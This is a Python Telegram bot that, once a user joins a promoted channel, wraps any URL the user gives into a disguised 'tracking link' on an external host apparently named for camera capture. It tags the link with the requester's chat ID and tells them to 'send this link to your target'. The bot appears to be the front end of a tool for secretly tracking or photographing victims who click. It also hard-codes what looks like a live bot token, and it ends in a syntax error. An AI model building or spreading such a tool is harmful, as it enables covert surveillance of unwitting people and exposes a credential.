import logging
import uuid
import base64
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, ContextTypes, MessageHandler, CommandHandler, filters
from telegram.error import TelegramError

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

RENDER_BASE_URL = "https://camera-y1vl.onrender.com"
CHANNEL_USERNAME = "@TeamLolOfficial"

async def check_channel_membership(bot, user_id):
    try:
        member = await bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        if member.status in ['member', 'administrator', 'creator']:
            return True
    except TelegramError as e:
        logging.error(f"Error checking membership: {e}")
    return False

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    is_joined = await check_channel_membership(context.bot, user_id)
    if not is_joined:
        keyboard = [
            [InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{CHANNEL_USERNAME.replace('@', '')}")],
            [InlineKeyboardButton("✅ Joined / Try Again", callback_data="check_join")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            f"❌ You must join our official channel before using this bot!\n\nPlease click below to join:",
            reply_markup=reply_markup
        )
        return

    context.user_data['waiting_for_url'] = False

    reply_markup = ReplyKeyboardMarkup(
        [["🔗 Create Link"]],
        resize_keyboard=True,
        is_persistent=True,
        input_field_placeholder="Click Create Link button..."
    )
    
    await update.message.reply_text(
        "👋 Welcome! Click the **🔗 Create Link** button below to start.",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    user_text = update.message.text.strip()
    
    is_joined = await check_channel_membership(context.bot, user_id)
    if not is_joined:
        keyboard = [
            [InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{CHANNEL_USERNAME.replace('@', '')}")],
            [InlineKeyboardButton("✅ Joined / Try Again", callback_data="check_join")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            f"❌ Please join our channel first:",
            reply_markup=reply_markup
        )
        return

    reply_markup = ReplyKeyboardMarkup(
        [["🔗 Create Link"]],
        resize_keyboard=True,
        is_persistent=True,
        input_field_placeholder="Click Create Link button..."
    )

    if user_text == "🔗 Create Link":
        context.user_data['waiting_for_url'] = True
        await update.message.reply_text(
            "Enter a valid url",
            reply_markup=reply_markup
        )
        return

    if context.user_data.get('waiting_for_url', False):
        target_url = user_text
        if not (target_url.startswith("http://") or target_url.startswith("https://")):
            target_url = "https://" + target_url

        encoded_url = base64.urlsafe_b64encode(target_url.encode()).decode()
        unique_id = str(uuid.uuid4())[:6]
        
        # ইউজারের Chat ID (cid) সহ ডায়নামিক লিঙ্ক তৈরি করা হচ্ছে
        tracking_link = f"{RENDER_BASE_URL}/?id={unique_id}&cid={user_id}&url={encoded_url}"
        
        response_msg = (
            f"🎯 **Target Tracking Link Created Successfully!**\n\n"
            f"🔗 Original Target: `{target_url}`\n\n"
            f"📤 Send this link to your target:\n{tracking_link}"
        )
        
        context.user_data['waiting_for_url'] = False
        await update.message.reply_text(response_msg, parse_mode="Markdown", reply_markup=reply_markup)
    else:
        await update.message.reply_text(
            "Please click the **🔗 Create Link** button first.",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )

if __name__ == '__main__':
    BOT_TOKEN = "8836334469:AAE6WOWEabXtkgCWVaIHhpMgTwAEQ3KxLdY"

    application = ApplicationBuilder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))

    print("Multi-user Dynamic link bot is running...")
    application.run_polling()v
